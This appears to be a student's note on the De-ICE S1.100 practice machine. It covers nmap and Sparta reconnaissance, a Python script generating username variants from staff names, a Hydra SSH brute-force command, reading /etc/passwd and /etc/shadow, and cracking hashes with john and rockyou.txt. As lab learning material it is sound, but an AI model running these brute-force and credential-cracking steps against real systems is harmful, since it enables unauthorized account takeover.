## Note on working on De-ICE: S1.100

### Begining
Many of time we have an IP to pentest and we must recognize what is behind that IP.
<br>
nmap is good tool to recognize services and OS runing on the remote machine.
<br>
for example we know that an apache web server is runing on port 80. then we can go to web site by a browser and collect information to next stages.
<br>
**Sparta** is a useful tool on kali for service recongnition. sparta uses nmap in 4 stage and have bruteforcer and ...

In company web site we can find email pattern and usernames and name and famliy of stuffs etc. that help us using names to generate username for bruteforce actions.

This script help us to generate username from some names. we must pass the name and famliy in a single line to it.

```
#!/usr/bin/env python
import sys

if __name__ == "__main__": 
	if len(sys.argv) != 2:
		print "usage: %s names.txt" % (sys.argv[0])
		sys.exit(0)

	for line in open(sys.argv[1]):
		name = ''.join([c for c in line if  c == " " or  c.isalpha()])

		tokens = name.lower().split()
		fname = tokens[0]
		lname = tokens[-1]

		print fname + lname		# johndoe
		print lname + fname		# doejohn
		print fname + "." + lname	# john.doe
		print lname + "." + fname	# doe.john
		print lname + fname[0]		# doej
		print fname[0] + lname		# jdoe
		print lname[0] + fname		# djoe
		print fname[0] + "." + lname	# j.doe
		print lname[0] + "." + fname	# d.john
		print fname			# john
		print lname # joe
```

after generating usernames in the next stage we need a good pass list to crack accounts(in this example bruteforce ssh via Sparta)
<br>
there is many tools for bruteforce and **Hydra** is a very good tool between them.

An example of using hydra:

```
/opt/hydra6/bin/hydra -L users.txt -P passwords.txt -t 5 -v -V -e n -e s -o results.txt 192.168.1.100 ssh
```

after finding password and login with `id` command we can findout user perviliges.
<br>
`sudo -l` help us to know user perviliges of runing commands.

**/etc/passwd**: consist of os users.
<br>
**/etc/shadow**: consist of user password's. hash of password is between two `:`.

with `john` we able to crack hashes and there is a good pass list in kali it's name is `rockyou.txt` useful to crack.

In this link the way of decrypte of open ssl encrypted file was describes.[https://blog.techorganic.com/2011/07/19/de-ice-hacking-challenge-part-1/](link). 